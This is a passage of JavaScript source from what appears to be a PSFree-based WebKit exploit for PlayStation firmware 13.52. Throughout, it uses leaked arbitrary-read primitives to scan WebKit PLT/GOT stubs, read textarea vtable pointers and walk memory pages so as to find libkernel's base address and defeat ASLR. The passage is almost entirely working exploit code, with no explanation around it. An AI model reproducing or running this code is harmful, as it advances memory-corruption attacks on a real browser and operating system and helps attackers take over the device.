            rangeTag: r0 ? r0.tag : "?",
            step: 0x10,
            scanLo: plan.lo,
            scanHi: plan.hi,
            rangeText: plan.rangeText || "",
            poops: plan.poops,
            tried: 0,
            stubsSeen: 0,
            gotNull: 0,
            hopFail: 0,
            fnExt: 0,
            fnLkFails: 0,
            nullSkips: 0,
            probe,
        };
        return {
            done: false,
            ok: false,
            state,
            phase: "probe",
            probe,
            rangeTag: state.rangeTag,
            cursor: state.cursor,
            rangeText: plan.rangeText,
        };
    }

    function psfreeRangeDoneChunk() {
        const fin = psfreeFinishRange(state);
        if (fin.advanced) {
            return {
                done: false,
                ok: false,
                state,
                phase: "range",
                rangeTag: fin.rangeTag,
                cursor: fin.cursor,
                tried: state.tried,
                stubsSeen: state.stubsSeen || 0,
                rangeText: state.rangeText,
            };
        }
        return psfreeMissChunk(state);
    }

    function notePsfreeTry(pltRva, res) {
        state.lastPlt = pltRva;
        if (!res) return null;
        if (res.kind === "no-stub" || res.kind === "disp-fail") return null;
        state.stubsSeen = (state.stubsSeen || 0) + 1;
        state.tried++;
        if (res.kind === "got-null") {
            state.gotNull = (state.gotNull || 0) + 1;
            return null;
        }
        if (res.kind === "hop-fail") {
            state.hopFail = (state.hopFail || 0) + 1;
            if (!state.lastRaw) state.lastRaw = res.raw;
            return null;
        }
        if (res.kind === "lk-fail") {
            state.fnExt = (state.fnExt || 0) + 1;
            state.lastFn = res.fnPtr;
            state.fnLkFails = (state.fnLkFails || 0) + 1;
            return null;
        }
        if (res.kind === "ok" && res.lk) {
            state.lastFn = res.fnPtr;
            return res;
        }
        return null;
    }

    if (state.phase === "cand") {
        const cands = state.cands || IMPORT_PLT_CANDS;
        while (state.candIdx < cands.length && reads + 8 <= MAX_READS) {
            const pltRva = cands[state.candIdx++];
            reads += 8;
            const hit = notePsfreeTry(pltRva, tryOnePsfreePlt(p, webkitBase, off, pltRva));
            if (hit) {
                return {
                    done: true,
                    ok: true,
                    lk: hit.lk,
                    pltRva: hit.pltRva,
                    fnPtr: hit.fnPtr,
                    via: hit.via,
                    stubOk: hit.stubOk,
                    source: "psfree+" + hit.pltRva.toString(16),
                    state,
                    phase: "hit",
                    tried: state.tried,
                    lastPlt: pltRva,
                    lastFn: hit.fnPtr,
                };
            }
        }
        state.phase = "scan";
    }

    const step = state.step || 4;

    while (reads + 8 <= MAX_READS) {
        if (state.cursor >= state.end)
            return psfreeRangeDoneChunk();

        const rva = state.cursor;
        if (state.poops && rva >= POOPS_OOM_LO && rva < 0xe0000)
            return psfreeRangeDoneChunk();

        state.cursor += step;
        const w0 = read4p(p, state.base.add32(rva));
        reads += 1;
        if (w0 == null) {
            state.nullSkips = (state.nullSkips || 0) + 1;
            const nextPage = ((rva + 0x4000) >>> 0) & ~0x3fff;
            if (nextPage >= state.end) {
                state.cursor = state.end;
                continue;
            }
            state.cursor = Math.max(state.cursor, nextPage);
            continue;
        }
        const w1 = read4p(p, state.base.add32(rva + 4));
        reads += 1;
        const bytes = [
            w0 & 0xff, (w0 >>> 8) & 0xff, (w0 >>> 16) & 0xff, (w0 >>> 24) & 0xff,
            w1 != null ? w1 & 0xff : 0,
            w1 != null ? (w1 >>> 8) & 0xff : 0,
            w1 != null ? (w1 >>> 16) & 0xff : 0,
        ];
        for (let i = 0; i < 7; i++) {
            const insnRva = rva + i;
            if (bytes[i] === 0xe8) {
                const rel = s32(read4p(p, state.base.add32(insnRva + 1)));
                reads += 1;
                if (rel == null) continue;
                const destRva = insnRva + 5 + rel;
                if (destRva < 0x1000 || destRva >= state.end) continue;
                reads += 7;
                const hit = notePsfreeTry(destRva, tryOnePsfreePlt(p, webkitBase, off, destRva));
                if (hit) {
                    return {
                        done: true,
                        ok: true,
                        lk: hit.lk,
                        pltRva: hit.pltRva,
                        fnPtr: hit.fnPtr,
                        via: hit.via,
                        stubOk: hit.stubOk,
                        source: "psfree-e8+" + insnRva.toString(16),
                        state,
                        phase: "hit",
                        tried: state.tried,
                        lastPlt: destRva,
                        lastFn: hit.fnPtr,
                    };
                }
                continue;
            }
            if (bytes[i] !== 0xff) continue;
            if (bytes[i + 1] !== 0x15 && bytes[i + 1] !== 0x25) continue;
            reads += 7;
            const hit = notePsfreeTry(insnRva, tryOnePsfreePlt(p, webkitBase, off, insnRva));
            if (hit) {
                return {
                    done: true,
                    ok: true,
                    lk: hit.lk,
                    pltRva: hit.pltRva,
                    fnPtr: hit.fnPtr,
                    via: hit.via,
                    stubOk: hit.stubOk,
                    source: "psfree-scan+" + hit.pltRva.toString(16),
                    state,
                    phase: "hit",
                    tried: state.tried,
                    lastPlt: insnRva,
                    lastFn: hit.fnPtr,
                };
            }
        }
    }

    return {
        done: false,
        ok: false,
        state,
        phase: state.phase === "cand" ? "cand" : "scan",
        cursor: state.cursor,
        rangeTag: state.rangeTag,
        tried: state.tried,
        lastPlt: state.lastPlt,
        lastFn: state.lastFn,
        stubsSeen: state.stubsSeen || 0,
        fnExt: state.fnExt || 0,
        fnLkFails: state.fnLkFails || 0,
        nullSkips: state.nullSkips || 0,
    };
}

/** Known __stack_chk_fail / early PLT stub RVAs from PSFree ports (low .text, NOT high IAT). */
const IMPORT_PLT_CANDS = [
    0x178, 0x188, 0x8d8, 0x918, 0x2438, 0x500, 0x600, 0x800, 0xa00, 0xc00,
    0x1000, 0x1200, 0x1400, 0x1600, 0x2000,
];

function importPltCandidates(off, scanLo) {
    const out = [];
    const seen = new Set();
    const minRva = scanLo || 0;
    function add(rva) {
        if (rva == null || rva < 0x100) return;
        if (rva < minRva) return;
        const k = rva >>> 0;
        if (seen.has(k)) return;
        seen.add(k);
        out.push(k);
    }
    if (off) {
        add(off.wk_plt_stack_chk_fail);
        add(off.wk_plt___error);
        add(off.wk_plt_memcpy);
    }
    for (let i = 0; i < IMPORT_PLT_CANDS.length; i++)
        add(IMPORT_PLT_CANDS[i]);
    return out;
}

function moduleBaseIsLibkernel(p, base) {
    if (!base) return false;
    return isLibkernelPrologue(p, base)
        || isLibkernelPrologue(p, base.add32(SCE_ELF_OFF));
}

function lkFromStubAddrLite(p, stubAddr, off) {
    const o = (off.k_stubs && off.k_stubs[20]) || 0x2cb70;
    const lk = stubAddr.sub32(o);
    if (lkAligned(lk) && checkPrologueAt(p, lk))
        return { lk, stubOff: o };
    return null;
}

/** ≤2 reads at fnPtr page — no far-offset or walk-back (unmapped reads OOM). */
function lkFromFnPtrLite(p, fnPtr, off) {
    if (!fnPtr || fnPtr.hi < 0x8) return null;
    const pageBase = new int64((fnPtr.low >>> 0) & ~0x3fff, fnPtr.hi >>> 0);
    if (lkAligned(pageBase) && checkPrologueAt(p, pageBase))
        return { lk: pageBase, iatRva: null, via: "page" };
    return null;
}

function lkFromFnPtr(p, fnPtr, off, iatRva) {
    if (!fnPtr) return null;

    const walked = findModuleBaseBackward(p, fnPtr, 128);
    if (walked && looksLikeLibkernelModule(p, walked))
        return { lk: walked, iatRva, errorFn: fnPtr, via: "elf-walk" };

    if (isGetpidStub(fnPtr)) {
        const hit = lkFromStubAddr(p, fnPtr, off);
        if (hit)
            return { lk: hit.lk, iatRva, errorFn: fnPtr, via: "getpid+" + hit.stubOff.toString(16) };
    }

    const entryB0 = read1p(p, fnPtr);
    if (entryB0 !== 0xb8) return null;

    const errs = kErrorCandidates(off);
    for (let i = 0; i < errs.length; i++) {
        const lk = fnPtr.sub32(errs[i]);
        if (lkAligned(lk) && isLibkernelPrologue(p, lk))
            return { lk, iatRva, errorFn: fnPtr, via: "error+" + errs[i].toString(16) };
    }

    const pageBase = new int64((fnPtr.low >>> 0) & ~0x3fff, fnPtr.hi >>> 0);
    if (lkAligned(pageBase) && isLibkernelPrologue(p, pageBase))
        return { lk: pageBase, iatRva, errorFn: fnPtr, via: "page" };

    return null;
}

/** Verify GOT slot — read8 + optional PLT hop + ≤4 follow-up reads. */
function safeVerifyGotSlot(p, webkitBase, off, rva) {
    if (!rvaAllowed(rva, off)) return null;
    const base = moduleLoadBase(p, webkitBase);
    let fnPtr = read8p(p, base.add32(rva));
    if (!fnPtr) return null;
    fnPtr = resolveImportPtr(p, base, off, fnPtr, 0);
    if (!fnPtr) return null;
    if (plausibleExtPtr(fnPtr, base, off))
        return lkFromFnPtr(p, fnPtr, off, rva);
    const walked = findModuleBaseBackward(p, fnPtr, 128);
    if (walked && looksLikeLibkernelModule(p, walked))
        return { lk: walked, iatRva: rva, errorFn: fnPtr, via: "got-walk" };
    return null;
}

function scanAnchorsInit(sub, anchors, radius, step) {
    sub = {
        anchorIdx: 0,
        anchors: anchors.map(a => ptrBig(a)),
        cursor: 0n,
        end: 0n,
        step: step,
        probes: 0,
    };
    const center = sub.anchors[0];
    sub.cursor = center > radius ? center - radius : 0n;
    sub.end = center + radius;
    return sub;
}

function scanAnchorsAdvance(sub, radius) {
    const next = sub.anchorIdx + 1;
    if (next >= sub.anchors.length) return false;
    sub.anchorIdx = next;
    const center = sub.anchors[next];
    sub.cursor = center > radius ? center - radius : 0n;
    sub.end = center + radius;
    return true;
}

/** Scan mapped .text for FF 15/FF 25 → GOT slots within cap. */
function scanPltGotChunk(p, webkitBase, off, state) {
    if (!state) {
        const base = moduleLoadBase(p, webkitBase);
        const textRanges = elfMappedTextRanges(p, webkitBase, off);
        if (!textRanges.length)
            return { done: true, lk: null, state: null, phase: "no-text" };
        state = {
            base,
            textRanges,
            rangeIdx: 0,
            cursor: textRanges[0].lo,
            endRva: textRanges[0].hi,
            seen: {},
            refs: 0,
            ff25: 0,
            gotHigh: 0,
            e8ext: 0,
        };
        return {
            done: false,
            state,
            phase: "plt-start",
            spans: textRanges.length,
        };
    }

    let batchBytes = 0;
    while (state.cursor < state.endRva && batchBytes < 128) {
        const rva = state.cursor;
        const w0 = read4p(p, state.base.add32(rva));
        const w1 = read4p(p, state.base.add32(rva + 4));
        if (w0 != null && w1 != null) {
            const bytes = [
                w0 & 0xff, (w0 >>> 8) & 0xff, (w0 >>> 16) & 0xff, (w0 >>> 24) & 0xff,
                w1 & 0xff, (w1 >>> 8) & 0xff, (w1 >>> 16) & 0xff, (w1 >>> 24) & 0xff,
            ];
            for (let i = 0; i < 7; i++) {
                if (bytes[i] === 0xe8) {
                    const insnRva = rva + i;
                    const rel = s32(read4p(p, state.base.add32(insnRva + 1)));
                    if (rel != null) {
                        const destRva = insnRva + 5 + rel;
                        if (destRva >= 0x10000) {
                            const destPtr = state.base.add32(destRva);
                            if (plausibleExtPtr(destPtr, state.base, off)) {
                                state.e8ext++;
                                const hit = lkFromFnPtr(p, destPtr, off, null);
                                if (hit) {
                                    saveLibkernelSession(hit.lk, hit.iatRva);
                                    return {
                                        done: true,
                                        lk: hit.lk,
                                        iatRva: hit.iatRva,
                                        source: "e8+" + insnRva.toString(16) + "/" + hit.via,
                                        state,
                                        phase: "plt-hit",
                                        refs: state.refs,
                                    };
                                }
                            }
                        }
                    }
                }
                if (bytes[i] !== 0xff) continue;
                if (bytes[i + 1] !== 0x15 && bytes[i + 1] !== 0x25) continue;
                state.ff25++;
                const insnRva = rva + i;
                const raw = read4p(p, state.base.add32(insnRva + 2));
                const disp = s32(raw);
                if (disp == null) continue;
                const gotRva = insnRva + 6 + disp;
                if (gotRva < 0x10000) continue;
                if (gotRva > iatCap(off)) {
                    state.gotHigh++;
                    continue;
                }
                const key = gotRva.toString(16);
                if (state.seen[key]) continue;
                state.seen[key] = 1;
                state.refs++;
                const hit = safeVerifyGotSlot(p, webkitBase, off, gotRva);
                if (hit) {
                    saveLibkernelSession(hit.lk, hit.iatRva);
                    return {
                        done: true,
                        lk: hit.lk,
                        iatRva: hit.iatRva,
                        source: "plt/" + hit.via,
                        state,
                        phase: "plt-hit",
                        refs: state.refs,
                    };
                }
            }
        }
        state.cursor += 4;
        batchBytes += 4;
    }

    if (state.cursor >= state.endRva) {
        const next = state.rangeIdx + 1;
        if (next < state.textRanges.length) {
            state.rangeIdx = next;
            state.cursor = state.textRanges[next].lo;
            state.endRva = state.textRanges[next].hi;
            return {
                done: false,
                state,
                phase: "plt-region",
                region: state.textRanges[next].tag,
                cursor: state.cursor,
            };
        }
        return { done: true, lk: null, state, phase: "plt-miss", refs: state.refs,
            ff25: state.ff25, gotHigh: state.gotHigh, e8ext: state.e8ext };
    }

    return {
        done: false,
        state,
        phase: "plt",
        cursor: state.cursor,
        refs: state.refs,
        ff25: state.ff25,
        e8ext: state.e8ext,
    };
}

/** Fast libkernel module hunt ±32MB — prologue/stub check on SCE/ELF hit (OOM-safe). */
function scanNearLibkernelChunk(p, webkitBase, off, sub, anchors, opts) {
    opts = opts || {};
    const RADIUS = opts.nearRadius != null ? BigInt(opts.nearRadius) : LK_HUNT_RADIUS;
    const STEP = 0x4000n;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "nearlk-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        sub.pages = 0;
        sub.hits = 0;
        return {
            done: false,
            state: sub,
            phase: "nearlk-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 6) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8) {
            sub.pages++;
            if ((addr.low & 0x3fff) === 0 && isLibkernelPrologue(p, addr)) {
                saveLibkernelSession(addr, null);
                return {
                    done: true,
                    lk: addr,
                    iatRva: null,
                    source: "nearlk-prologue-direct",
                    state: sub,
                    phase: "nearlk-hit",
                    pages: sub.pages,
                };
            }
            const magic = read4p(p, addr);
            if (magic != null && isModuleMagic(magic)
                && !isSameWebkitModule(addr, webkitBase, off)) {
                sub.hits++;
                if (isLibkernelPrologue(p, addr)) {
                    saveLibkernelSession(addr, null);
                    return {
                        done: true,
                        lk: addr,
                        iatRva: null,
                        source: "nearlk-prologue",
                        state: sub,
                        phase: "nearlk-hit",
                        pages: sub.pages,
                    };
                }
                const sc = scoreSyscallStubs(p, addr, 0x40000, 0x400);
                if (sc >= 4) {
                    saveLibkernelSession(addr, null);
                    return {
                        done: true,
                        lk: addr,
                        iatRva: null,
                        source: "nearlk-stubs=" + sc,
                        state: sub,
                        phase: "nearlk-hit",
                        pages: sub.pages,
                    };
                }
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "nearlk-anchor",
                anchor: sub.anchorIdx,
                pages: sub.pages,
                hits: sub.hits,
            };
        }
        return {
            done: true,
            lk: null,
            state: sub,
            phase: "nearlk-miss",
            pages: sub.pages,
            hits: sub.hits,
        };
    }

    return {
        done: false,
        state: sub,
        phase: "nearlk",
        at: sub.cursor.toString(16),
        pages: sub.pages,
        hits: sub.hits,
        anchor: sub.anchorIdx,
    };
}

/** ±128MB prologue ring — libkernel may have poops text base (no SCE magic). */
function scanLkPrologueRingChunk(p, off, sub, anchors) {
    const RADIUS = LK_RING_RADIUS;
    const STEP = 0x4000n;

    if (!anchors || !anchors.length)
        return { done: true, lk: null, state: sub, phase: "ring-skip" };

    if (!sub) {
        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
        sub.probes = 0;
        return {
            done: false,
            state: sub,
            phase: "ring-start",
            anchor: 0,
            from: sub.cursor.toString(16),
            to: sub.end.toString(16),
        };
    }

    let batch = 0;
    while (sub.cursor <= sub.end && batch < 6) {
        const addr = bigToPtr(sub.cursor);
        if (addr.hi >= 0x8 && (addr.low & 0x3fff) === 0) {
            sub.probes++;
            if (isLibkernelPrologue(p, addr)) {
                saveLibkernelSession(addr, null);
                return {
                    done: true,
                    lk: addr,
                    iatRva: null,
                    source: "ring-prologue",
                    state: sub,
                    phase: "ring-hit",
                    probes: sub.probes,
                };
            }
        }
        sub.cursor += sub.step;
        batch++;
    }

    if (sub.cursor > sub.end) {
        if (scanAnchorsAdvance(sub, RADIUS)) {
            return {
                done: false,
                state: sub,
                phase: "ring-anchor",
                anchor: sub.anchorIdx,
                probes: sub.probes,
            };
        }
        return { done: true, lk: null, state: sub, phase: "ring-miss", probes: sub.probes };
    }

    return {
        done: false,
        state: sub,
        phase: "ring",
        at: sub.cursor.toString(16),
        probes: sub.probes,
        anchor: sub.anchorIdx,
    };
}

/** Scan leakval + PSFree textarea vtable entries (heap/code ptrs only — OOM-safe). */
function scanLeakExtPtrChunk(p, webkitBase, off, state, retain) {
    if (!state) {
        const targets = [];
        try {
            const ta = document.createElement("textarea");
            if (retain) retain.push(ta);
            targets.push({ label: "textarea", cell: p.leakval(ta) });
        } catch (_) { }
        try {
            targets.push({ label: "expm1", cell: p.leakval(Math.expm1) });
        } catch (_) { }
        try {
            targets.push({ label: "parseFloat", cell: p.leakval(parseFloat) });
        } catch (_) { }
        if (!targets.length)
            return { done: true, lk: null, state: null, phase: "leak-empty" };
        state = {
            targets,
            tIdx: 0,
            slotOff: 0,
            tried: 0,
            stage: "psfree",
            vtIdx: 0,
            extSeen: {},
            extList: [],
        };
        return { done: false, state, phase: "leak-start", targets: targets.length };
    }

    function noteExt(fnPtr, source) {
        if (!fnPtr || !plausibleExtPtr(fnPtr, webkitBase, off)) return null;
        const key = String(fnPtr);
        if (state.extSeen[key]) return null;
        state.extSeen[key] = source;
        state.tried++;
        if (state.extList.length < 16)
            state.extList.push({ ptr: key, source });
        const hit = lkFromFnPtrPsfree(p, fnPtr, off, null, webkitBase);
        if (!hit) return null;
        saveLibkernelSession(hit.lk, hit.iatRva);
        return {
            done: true,
            lk: hit.lk,
            iatRva: hit.iatRva,
            source: source + "/" + hit.via,
            state,
            phase: "leak-hit",
            tried: state.tried,
        };
    }

    let batch = 0;
    while (batch < 4) {
        if (state.stage === "psfree") {
            const ta = state.targets[0];
            state.webcore = read8p(p, ta.cell.add32(0x18));
            state.vtable = state.webcore ? read8p(p, state.webcore) : null;
            state.stage = state.vtable ? "vtable" : "heap";
            state.vtIdx = 0;
            batch++;
            continue;
        }
        if (state.stage === "vtable") {
            if (state.vtIdx >= 48) {
                state.stage = "heap";
                state.tIdx = 0;
                state.slotOff = 0;
                continue;
            }
            const idx = state.vtIdx++;
            const fnPtr = read8p(p, state.vtable.add32(idx * 8));
            batch++;
            const hit = noteExt(fnPtr, "vtable[" + idx + "]");
            if (hit) return hit;
            continue;
        }
        if (state.stage === "heap") {
            const SLOT_MAX = 0x100;
            while (state.tIdx < state.targets.length && batch < 4) {
                const t = state.targets[state.tIdx];
                while (state.slotOff <= SLOT_MAX && batch < 4) {
                    const offSlot = state.slotOff;
                    state.slotOff += 8;
                    batch++;
                    const fnPtr = read8p(p, t.cell.add32(offSlot));
                    const hit = noteExt(fnPtr, t.label + "+0x" + offSlot.toString(16));
                    if (hit) return hit;
                }
                state.tIdx++;
                state.slotOff = 0;
            }
            if (state.tIdx >= state.targets.length) {
                return {
                    done: true,
                    lk: null,
                    state,
                    phase: "leak-miss",
                    tried: state.tried,
                    extList: state.extList,
                };
            }
            return {
                done: false,
                state,
                phase: "leak",
                tried: state.tried,
                target: state.tIdx,
            };
        }
        break;
    }
    return {
        done: false,
        state,
        phase: "leak",
        tried: state.tried,
        target: state.tIdx || 0,
    };
}

/** Log-only — never reads (blind module probes OOM on 13.52). */
export function showLibkernelGuesses(webkitBase, nativeFn, log) {
    log = log || (() => {});
    log("LK-GUESS-HINT", "blind address reads OOM — paste ptr from cal vtable instead");
    const cands = estimateLibkernelCandidates(webkitBase, nativeFn);
    for (let i = 0; i < cands.length; i++)
        log("LK-GUESS", cands[i].hex + " (" + cands[i].why + ") — DO NOT read, paste cal ptr");
    return { ok: false, cands };
}

/** @deprecated blind reads OOM — use showLibkernelGuesses */
export function probeLibkernelGuesses(p, webkitBase, nativeFn, log) {
    return showLibkernelGuesses(webkitBase, nativeFn, log);
}

/** 13.52 libkernel export RVAs — allowlist only (no k_getpid_syscall / kernel keys). */
const LK_RVA_PRI = {
    k_usleep: 0,
    k__error: 1,
    k_open: 2,
    k_read: 3,
    k_write: 4,
    k_close: 5,
    k_stat: 6,
    k_pread: 7,
    k_pwrite: 8,
    k_lseek: 9,
    k_unlink: 10,
    k_notify: 11,
    k_socket: 12,
    k_connect: 13,
    k_connect_alt: 14,
    k_mmap: 15,
    k_jitshm_create: 16,
    k_jitshm_alias: 17,
};

export function libkernelRvaTable(off) {
    off = off || {};
    const out = [];
    for (const key of Object.keys(LK_RVA_PRI)) {
        const rva = off[key];
        if (typeof rva !== "number" || rva <= 0) continue;
        out.push({
            key,
            rva,
            pri: LK_RVA_PRI[key],
        });
    }
    out.sort(function (a, b) {
        return a.pri - b.pri || a.rva - b.rva;
    });
    return out;
}

function looksLikeLkBase(lk, off) {
    if (!userlandPtrOk(lk)) return false;
    return lkAligned(lk);
}

/**
 * lk from ext fn ptr — 0 reads. 13.52 imports rarely satisfy raw fn−RVA alignment;
 * also tries page-align(fn−RVA) and page-walk reverse Δ match (PSFree style).
 */
export function calcLkFromFnPtrZeroRead(fnPtr, off) {
    if (!userlandPtrOk(fnPtr)) return [];
    off = off || {};
    const table = libkernelRvaTable(off);
    const out = [];
    const seen = new Set();
    const fnB = ptrBig(fnPtr);

    for (let i = 0; i < table.length; i++) {
        const row = table[i];
        const raw = fnPtr.sub32(row.rva);
        pushLkZeroRead(out, seen, raw, row, "rva-" + row.key, 0, off);
        const pg = pageAlignDown(raw, 0x4000);
        if (String(pg) !== String(raw))
            pushLkZeroRead(out, seen, pg, row, "rva-" + row.key + "+page", 1, off);
    }

    let page = pageAlignDown(fnPtr, 0x4000);
    for (let step = 0; step < LK_PAGE_WALK_MAX; step++) {
        if (!userlandPtrOk(page) || !lkAligned(page)) break;
        const delta = Number(fnB - ptrBig(page));
        if (delta > 0 && delta < 0x500000) {
            for (let ti = 0; ti < table.length; ti++) {
                const row = table[ti];
                if (row.rva === delta) {
                    pushLkZeroRead(out, seen, page, row, "rev-" + row.key, 0, off);
                } else if (Math.abs(row.rva - delta) <= 0x3f) {
                    pushLkZeroRead(out, seen, page, row, "rev~" + row.key, 3, off);
                }
            }
        }
        page = page.sub32(0x4000);
    }

    out.sort(function (a, b) { return a.pri - b.pri; });
    return out;
}

/** Single best lk guess from ext code ptr — 0 reads. */
export function calcLkBestFromFnPtr(fnPtr, off) {
    const cands = calcLkFromFnPtrZeroRead(fnPtr, off);
    return cands.length ? cands[0] : null;
}

const SS_PLT_ONE_IDX = "wk-plt-one-idx";

/**
 * One low .text PLT try — reads webkit GOT only, lk = fn−RVA (0 reads @ lk).
 * Tap again to cycle PLT candidates (NOT a scan — one stub per tap).
 */
export function resolveLkOnePltStep(p, webkitBase, off, opts) {
    opts = opts || {};
    if (!p || !webkitBase) return { ok: false, error: "need p + webkitBase" };
    const cands = importPltCandidates(off, POOPS_SCAN_LO);
    if (!cands.length) return { ok: false, error: "no plt list" };
    let idx = 0;
    try { idx = parseInt(sessionStorage.getItem(SS_PLT_ONE_IDX) || "0", 10) || 0; } catch (_) { }
    idx = ((idx % cands.length) + cands.length) % cands.length;
    const pltRva = cands[idx];
    if (opts.advance !== false) {
        try { sessionStorage.setItem(SS_PLT_ONE_IDX, String((idx + 1) % cands.length)); } catch (_) { }
    }
    const base = moduleLoadBase(p, webkitBase);
    const stub = base.add32(pltRva);
    const op = read2p(p, stub);
    if (op !== 0x25ff && op !== 0x15ff)
        return { ok: false, pltRva, idx, total: cands.length, error: "not plt op=" + (op != null ? op.toString(16) : "null") };
    const disp = s32(read4p(p, stub.add32(2)));
    if (disp == null)
        return { ok: false, pltRva, idx, total: cands.length, error: "disp read fail" };
    const raw = read8p(p, stub.add32(6 + disp));
    if (!raw || raw.hi < 0x8)
        return { ok: false, pltRva, idx, total: cands.length, error: "got slot empty" };
    const fn = resolveImportPtr(p, base, off, raw, 0);
    if (!fn)
        return { ok: false, pltRva, idx, total: cands.length, error: "import resolve fail", raw: String(raw) };
    const hits = calcLkFromFnPtrZeroRead(fn, off);
    if (hits.length) {
        return {
            ok: true, lk: hits[0].lk, pltRva, idx, total: cands.length,
            fnPtr: fn, via: hits[0].via,
        };
    }
    if (off.k_usleep != null) {
        const hits = calcLkFromFnPtrZeroRead(fn, off);
        if (hits.length) {
            return {
                ok: true, lk: hits[0].lk, pltRva, idx, total: cands.length,
                fnPtr: fn, via: hits[0].via,
            };
        }
        const lkUs = fn.sub32(off.k_usleep);
        const lkUsPg = pageAlignDown(lkUs, 0x4000);
        if (looksLikeLkBase(lkUsPg, off))
            return {
                ok: true, lk: lkUsPg, pltRva, idx, total: cands.length,
                fnPtr: fn, via: "usleep-page-" + off.k_usleep.toString(16),
            };
    }
    if (off.k__error != null) {
        const lk = fn.sub32(off.k__error);
        const lkPg = pageAlignDown(lk, 0x4000);
        if (looksLikeLkBase(lkPg, off))
            return {
                ok: true, lk: lkPg, pltRva, idx, total: cands.length,
                fnPtr: fn, via: "error-page-" + off.k__error.toString(16),
            };
    }
    return {
        ok: false, pltRva, idx, total: cands.length,
        fnPtr: fn, error: "fn−RVA miss (try rev walk / not libkernel import)",
    };
}

/** Accept lk from Suchi RVA math / 16KB alignment — 0 reads (peek @ lk OOMs on poops). */
export function verifyLibkernelZeroRead(lk, off, opts) {
    off = off || {};
    opts = opts || {};
    if (!lk) return { ok: false, error: "no address" };
    if (!userlandPtrOk(lk))
        return { ok: false, error: "not userland ptr" };
    if (!looksLikeLkBase(lk, off)) {
        const lo14 = (lk.low >>> 0) & 0x3fff;
        return {
            ok: false,
            error: "want 16KB-aligned lk (…000), got …" + lo14.toString(16),
        };
    }
    return {
        ok: true,
        strong: true,
        lk,
        via: opts.via || "zero-read",
        reads: 0,
    };
}

/**
 * lk = fnPtr − k_usleep when Suchi prologue @ fnPtr (no sprx / no decrypt).
 * Returns null if fnPtr is not usleep entry.
 */
export function calcLkFromFnPtr(p, fnPtr, off) {
    off = off || {};
    if (!p || !fnPtr || fnPtr.hi < 0x8) return null;
    const usleepOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
    if (!checkPrologueAt(p, fnPtr) && read4p(p, fnPtr) !== 0x554889e5)
        return null;
    const lk = fnPtr.sub32(usleepOff);
    if (!lkAligned(lk)) return null;
    return { lk, usleepOff, fnPtr, via: "fn-usleep-" + usleepOff.toString(16) };
}

/** ≤2 reads — 13.52 usleep/__error prologue (Suchi dump + BillZai game base trial). */
export function verifyLibkernelUsleep1352(p, lk, off) {
    off = off || {};
    if (!p || !lk) return { ok: false, error: "no address" };
    const usleepOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
    const errOff = off.k__error != null ? off.k__error : 0x1bb0;
    const wUsleep = read4p(p, lk.add32(usleepOff));
    if (wUsleep == null)
        return { ok: false, error: "UNMAPPED @ usleep+" + usleepOff.toString(16) };
    const usleepOk = checkPrologueAt(p, lk.add32(usleepOff))
        || (wUsleep >>> 0) === 0x554889e5;
    if (!usleepOk)
        return {
            ok: false,
            error: "usleep prologue miss raw=0x" + (wUsleep >>> 0).toString(16),
            wUsleep,
            usleepOff,
        };
    const wErr = read4p(p, lk.add32(errOff));
    const errOk = wErr != null && (checkPrologueAt(p, lk.add32(errOff))
        || (wErr >>> 0) === 0x554889e5);
    return {
        ok: true,
        strong: errOk,
        lk,
        usleepOff,
        errOff,
        wUsleep,
        wErr,
        warn: errOk ? null : "__error prologue miss @ +" + errOff.toString(16),
    };
}

/** ≤6 reads — prologue + optional getpid stub (no module walk). */
export function verifyLibkernelBase(p, lk, off, opts) {
    opts = opts || {};
    if (!lk) return { ok: false, error: "no address" };
    if ((lk.low & 0x3fff) !== 0)
        return { ok: false, error: "not 16KB-aligned" };
    if (!isLibkernelPrologue(p, lk, opts))
        return { ok: false, error: "prologue miss @ " + lk };
    const offs = getpidStubOffsets(off);
    for (let i = 0; i < offs.length; i++) {
        const stub = read8p(p, lk.add32(offs[i]));
        if (stub && isGetpidStub(stub))
            return { ok: true, lk, stubOff: offs[i], stub, strong: true };
    }
    return { ok: true, lk, weak: true, warn: "prologue OK — getpid stub not at known offsets" };
}

/** Resolve hardcoded / session cal ext ptrs — no vtable, no code-page read. */
function scanKnownExtPtrChunk(p, webkitBase, off, state, opts) {
    opts = opts || {};
    if (!state) {
        let ptrs = (opts.knownExtPtrs) || [];
        const maxN = opts.knownMax != null ? opts.knownMax : (opts.lite ? 0 : ptrs.length);
        if (maxN <= 0 || opts.skipKnown) {
            return { done: true, lk: null, state: null, phase: "known-skip", n: 0 };
        }
        if (ptrs.length > maxN) ptrs = ptrs.slice(0, maxN);
        state = { ptrs: ptrs, idx: 0 };
        if (!ptrs.length)
            return { done: true, lk: null, state: null, phase: "known-skip", n: 0 };
        return { done: false, state, phase: "known-start", n: ptrs.length };
    }

    const batchMax = opts.knownBatch != null ? opts.knownBatch : (opts.lite ? 1 : 2);
    let batch = 0;
    while (state.idx < state.ptrs.length && batch < batchMax) {
        const raw = state.ptrs[state.idx++];
        batch++;
        const fnPtr = parseAddrSync(String(raw).replace(/^0x/i, ""));
        if (!fnPtr) continue;
        const walkOpts = Object.assign({}, opts, {
            maxWalkPages: opts.knownWalkPages != null ? opts.knownWalkPages
                : (opts.lite ? 0 : (opts.maxWalkPages != null ? opts.maxWalkPages : 24)),
        });
        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, walkOpts);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            return {
                done: true,
                ok: true,
                lk: hit.lk,
                iatRva: hit.iatRva,
                source: "known+" + raw + "/" + hit.via,
                state,
                phase: "known-hit",
                tried: state.idx,
            };
        }
    }

    if (state.idx >= state.ptrs.length) {
        return {
            done: true,
            lk: null,
            state,
            phase: "known-miss",
            tried: state.ptrs.length,
        };
    }
    return { done: false, state, phase: "known", idx: state.idx, total: state.ptrs.length };
}

